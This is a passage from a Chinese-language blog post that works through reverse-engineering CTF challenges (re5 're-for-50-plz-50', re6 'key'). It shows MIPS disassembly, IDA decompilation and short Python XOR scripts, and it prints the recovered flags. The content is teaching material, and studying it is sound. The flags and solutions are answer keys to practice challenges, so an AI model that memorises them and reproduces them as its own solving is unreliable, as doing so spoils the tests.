&#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dump出dword_402150[] 和 byte_402130[]的数据，解密即可：</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">byte_402130 = <span class="string">"this_is_not_flag"</span></span><br><span class="line">dword_402150 = [<span class="number">0x12</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x14</span>,</span><br><span class="line">                <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0x4A</span>, <span class="number">0x3D</span>,</span><br><span class="line">                <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x67</span>,</span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">                <span class="number">0x46</span>, <span class="number">0x5A</span>, <span class="number">0x44</span>, <span class="number">0x42</span>,</span><br><span class="line">                <span class="number">0x6E</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0x72</span>,</span><br><span class="line">                <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x3E</span>,</span><br><span class="line">                <span class="number">0x4B</span>, <span class="number">0x5F</span>, <span class="number">0x02</span>, <span class="number">0x01</span>,</span><br><span class="line">                <span class="number">0x4C</span>, <span class="number">0x5E</span>, <span class="number">0x5B</span>, <span class="number">0x17</span>,</span><br><span class="line">                <span class="number">0x6E</span>, <span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x68</span>,</span><br><span class="line">                <span class="number">0x5B</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">                <span class="number">0x48</span>]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    s = s + chr(dword_402150[i] ^ ord(byte_402130[i%<span class="number">16</span>]))</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span><br></pre></td></tr></table></figure><hr><h1>re5 re-for-50-plz-50</h1><p>打开文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">guiu@DESKTOP-EHD7P0U:/mnt/c/Users/HP/Documents/攻防世界逆向$ ./79cb4ed2fa1c41289dce5c9b1d7cc283</span><br><span class="line">-bash: ./79cb4ed2fa1c41289dce5c9b1d7cc283: cannot execute binary file: Exec format error</span><br><span class="line">guiu@DESKTOP-EHD7P0U:/mnt/c/Users/HP/Documents/攻防世界逆向$ file 79cb4ed2fa1c41289dce5c9b1d7cc283</span><br><span class="line">79cb4ed2fa1c41289dce5c9b1d7cc283: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=1d5c00adcd4cbb883fea12bc860f827d023e416f, not stripped</span><br><span class="line">guiu@DESKTOP-EHD7P0U:/mnt/c/Users/HP/Documents/攻防世界逆向$</span><br></pre></td></tr></table></figure><p>MIPS 指令集，换设备跑一下（我这边用的路由器）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[RT-AC54U /media/AiDisk_a1]<span class="comment"># ./79cb4ed2fa1c41289dce5c9b1d7cc283 </span></span><br><span class="line">Segmentation fault</span><br><span class="line">[RT-AC54U /media/AiDisk_a1]<span class="comment"># ./79cb4ed2fa1c41289dce5c9b1d7cc283 121313</span></span><br><span class="line">NOOOOOOOOOOOOOOOOOO</span><br><span class="line">[RT-AC54U /media/AiDisk_a1]<span class="comment"># ./79cb4ed2fa1c41289dce5c9b1d7cc283 asdasdasdasdasdasdasdasdasdasdasda</span></span><br><span class="line">NOOOOOOOOOOOOOOOOOO</span><br><span class="line">[RT-AC54U /media/AiDisk_a1]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>IDA招呼：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568911945157.png" alt="1568911945157.png"></p><p>不能反编译,直接读汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">.text:00401398  # int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401398                 .globl main</span><br><span class="line">.text:00401398 main:                                    # DATA XREF: sub_40115C+C↑o</span><br><span class="line">.text:00401398                                          # .got:main_ptr↓o</span><br><span class="line">.text:00401398</span><br><span class="line">.text:00401398 var_18          &#x3D; -0x18</span><br><span class="line">.text:00401398 var_10          &#x3D; -0x10</span><br><span class="line">.text:00401398 var_8           &#x3D; -8</span><br><span class="line">.text:00401398 var_4           &#x3D; -4</span><br><span class="line">.text:00401398 arg_0           &#x3D;  0</span><br><span class="line">.text:00401398 arg_4           &#x3D;  4</span><br><span class="line">.text:00401398</span><br><span class="line">.text:00401398                 addiu   $sp, -0x28</span><br><span class="line">.text:0040139C                 sw      $ra, 0x28+var_4($sp)</span><br><span class="line">.text:004013A0                 sw      $fp, 0x28+var_8($sp)</span><br><span class="line">.text:004013A4                 move    $fp, $sp</span><br><span class="line">.text:004013A8                 li      $gp, 0x4AC770</span><br><span class="line">.text:004013B0                 sw      $gp, 0x28+var_18($sp)</span><br><span class="line">.text:004013B4                 sw      $a0, 0x28+arg_0($fp)</span><br><span class="line">.text:004013B8                 sw      $a1, 0x28+arg_4($fp)</span><br><span class="line">.text:004013BC                 sw      $zero, 0x28+var_10($fp)</span><br><span class="line">.text:004013C0                 j       loc_401434</span><br><span class="line">.text:004013C4                 move    $at, $at</span><br><span class="line">.text:004013C8  # ---------------------------------------------------------------------------</span><br><span class="line">.text:004013C8</span><br><span class="line">.text:004013C8 loc_4013C8:                              # CODE XREF: main+A4↓j</span><br><span class="line">.text:004013C8                 lui     $v0, 0x4A</span><br><span class="line">.text:004013CC                 addiu   $v1, $v0, (meow - 0x4A0000)  # &quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;</span><br><span class="line">.text:004013D0                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:004013D4                 addu    $v0, $v1, $v0</span><br><span class="line">.text:004013D8                 lb      $v1, 0($v0)</span><br><span class="line">.text:004013DC                 lw      $v0, 0x28+arg_4($fp)</span><br><span class="line">.text:004013E0                 addiu   $v0, 4</span><br><span class="line">.text:004013E4                 lw      $a0, 0($v0)</span><br><span class="line">.text:004013E8                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:004013EC                 addu    $v0, $a0, $v0</span><br><span class="line">.text:004013F0                 lb      $v0, 0($v0)</span><br><span class="line">.text:004013F4                 xori    $v0, 0x37&#x2F;&#x2F; 将前面的字符串和0x37异或</span><br><span class="line">.text:004013F8                 sll     $v0, 24</span><br><span class="line">.text:004013FC                 sra     $v0, 24</span><br><span class="line">.text:00401400                 beq     $v1, $v0, loc_401428</span><br><span class="line">.text:00401404                 move    $at, $at</span><br><span class="line">.text:00401408                 lui     $v0, 0x47</span><br><span class="line">.text:0040140C                 addiu   $a0, $v0, (aNooooooooooooo - 0x470000)  # &quot;NOOOOOOOOOOOOOOOOOO\n&quot;</span><br><span class="line">.text:00401410                 jal     print</span><br><span class="line">.text:00401414                 move    $at, $at</span><br><span class="line">.text:00401418                 lw      $gp, 0x28+var_18($fp)</span><br><span class="line">.text:0040141C                 jal     exit_funct</span><br><span class="line">.text:00401420                 move    $at, $at</span><br><span class="line">.text:00401424                 lw      $gp, 0x28+var_18($fp)</span><br><span class="line">.text:00401428</span><br><span class="line">.text:00401428 loc_401428:                              # CODE XREF: main+68↑j</span><br><span class="line">.text:00401428                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:0040142C                 addiu   $v0, 1</span><br><span class="line">.text:00401430                 sw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:00401434</span><br><span class="line">.text:00401434 loc_401434:                              # CODE XREF: main+28↑j</span><br><span class="line">.text:00401434                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:00401438                 slti    $v0, 0x1F</span><br><span class="line">.text:0040143C                 bnez    $v0, loc_4013C8</span><br><span class="line">.text:00401440                 move    $at, $at</span><br><span class="line">.text:00401444                 lui     $v0, 0x47</span><br><span class="line">.text:00401448                 addiu   $a0, $v0, (aC0ngr4ssulatio - 0x470000)  # &quot;C0ngr4ssulations!! U did it.&quot;</span><br><span class="line">.text:0040144C                 la      $v0, puts</span><br><span class="line">.text:00401450                 move    $t9, $v0</span><br><span class="line">.text:00401454                 jalr    $t9 ; puts</span><br><span class="line">.text:00401458                 move    $at, $at</span><br><span class="line">.text:0040145C                 lw      $gp, 0x28+var_18($fp)</span><br><span class="line">.text:00401460                 jal     exit_funct</span><br><span class="line">.text:00401464                 move    $at, $at</span><br><span class="line">.text:00401468                 lw      $gp, 0x28+var_18($fp)</span><br><span class="line">.text:0040146C                 li      $v0, 1</span><br><span class="line">.text:00401470                 move    $sp, $fp</span><br><span class="line">.text:00401474                 lw      $ra, 0x28+var_4($sp)</span><br><span class="line">.text:00401478                 lw      $fp, 0x28+var_8($sp)</span><br><span class="line">.text:0040147C                 addiu   $sp, 0x28</span><br><span class="line">.text:00401480                 jr      $ra</span><br><span class="line">.text:00401484                 move    $at, $at</span><br><span class="line">.text:00401484  # End of function main</span><br></pre></td></tr></table></figure><p>于是解密代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ"</span></span><br><span class="line">print(<span class="string">''</span>.join([chr(<span class="number">0x37</span> ^ ord(s)) <span class="keyword">for</span> s <span class="keyword">in</span> str1]))</span><br></pre></td></tr></table></figure><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TUCTF&#123;but_really_whoisjohngalt&#125;</span><br></pre></td></tr></table></figure><hr><h1>re6 key</h1><p>一开始以为sub_4020C0 是关键的比较函数，但是我分析了半天发现不太对，回过头才看到被忽略了的两个关键点。</p><p>main()</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401100</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">void</span> **v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp-4h] [ebp-13Ch]</span></span><br><span class="line">  <span class="keyword">int</span> Dst; <span class="comment">// [esp+14h] [ebp-124h]</span></span><br><span class="line">  <span class="keyword">char</span> v32[<span class="number">4</span>]; <span class="comment">// [esp+20h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [esp+24h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+5Ch] [ebp-DCh]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [esp+61h] [ebp-D7h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [esp+64h] [ebp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [esp+68h] [ebp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [esp+6Ch] [ebp-CCh]</span></span><br><span class="line">  FILE *<span class="built_in">File</span>; <span class="comment">// [esp+70h] [ebp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [esp+84h] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v41; <span class="comment">// [esp+CCh] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v42; <span class="comment">// [esp+DCh] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v43; <span class="comment">// [esp+E0h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">void</span> *v44; <span class="comment">// [esp+E4h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v45; <span class="comment">// [esp+F4h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v46; <span class="comment">// [esp+F8h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">void</span> *Memory[<span class="number">4</span>]; <span class="comment">// [esp+FCh] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v48; <span class="comment">// [esp+10Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v49; <span class="comment">// [esp+110h] [ebp-28h]</span></span><br><span class="line">  __int128 v50; <span class="comment">// [esp+114h] [ebp-24h]</span></span><br><span class="line">  __int16 v51; <span class="comment">// [esp+124h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v52; <span class="comment">// [esp+126h] [ebp-12h]</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [esp+134h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v46 = <span class="number">15</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v44) = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">15</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v41) = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v53) = <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">1684630885</span>;</span><br><span class="line">  LOWORD(v49) = <span class="number">97</span>;</span><br><span class="line">  *(_OWORD *)Memory = xmmword_40528C;</span><br><span class="line">  v51 = <span class="number">11836</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v50 = xmmword_4052A4;                         <span class="comment">// v50 == "&gt;----++++....&lt;&lt;&lt;&lt;."</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_4021E0(&amp;v41, <span class="number">1u</span>, (*((_BYTE *)Memory + v0) ^ *((_BYTE *)&amp;v50 + v0)) + <span class="number">22</span>);<span class="comment">// 这里才是关键点</span></span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">18</span> );</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">15</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(Memory[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v53) = <span class="number">2</span>;</span><br><span class="line">  v2 = v43;</span><br><span class="line">  v3 = (<span class="keyword">void</span> **)v41;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v41;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">16</span> )</span><br><span class="line">      v4 = v3;</span><br><span class="line">    sub_4021E0(Memory, <span class="number">1u</span>, *((_BYTE *)v4 + v1++) + <span class="number">9</span>);<span class="comment">// 还有这里，遍历+9</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &lt; <span class="number">18</span> );</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">184u</span>);                        <span class="comment">// Dst 初始化</span></span><br><span class="line">  sub_401620(&amp;Dst, v5, v6, v7, v8);             <span class="comment">// 关键点 读取flag.txt 在后面比较</span></span><br><span class="line">  LOBYTE(v53) = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v32[*(_DWORD *)(Dst + <span class="number">4</span>)] &amp; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"?W?h?a?t h?a?p?p?e?n?"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v9, v10);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_402E90(&amp;Dst, (<span class="keyword">int</span>)&amp;v44);                  <span class="comment">// Dst传到v44，不知道值变了没有，先不管</span></span><br><span class="line">  v11 = &amp;v33;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">File</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_4022F0(&amp;v33) )</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( fclose(<span class="built_in">File</span>) )</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_streambuf&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::_Init(&amp;v33);</span><br><span class="line">  v36 = dword_408590;</span><br><span class="line">  <span class="built_in">File</span> = <span class="number">0</span>;</span><br><span class="line">  v37 = dword_408594;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    <span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::setstate((<span class="keyword">char</span> *)&amp;Dst + *(_DWORD *)(Dst + <span class="number">4</span>), <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v13 = Memory;</span><br><span class="line">  <span class="keyword">if</span> ( v49 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    v13 = (<span class="keyword">void</span> **)Memory[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( sub_4020C0(&amp;v44, v12, v45, (<span class="keyword">int</span>)v13, v48) )<span class="comment">// 关键点，4020c0为比较flag的函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    v28 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"=W=r=o=n=g=K=e=y="</span>, sub_402C50);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"|------------------------------|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v14, v15);</span><br><span class="line">    v16 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"|==============================|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v16, v17);</span><br><span class="line">    v18 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"|==============================|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v18, v19);</span><br><span class="line">    v20 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"|==============================|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v20, v21);</span><br><span class="line">    v22 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"\\  /\\  /\\  /\\  /\\==============|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v22, v23);</span><br><span class="line">    v24 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">" \\/  \\/  \\/  \\/  \\=============|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v24, 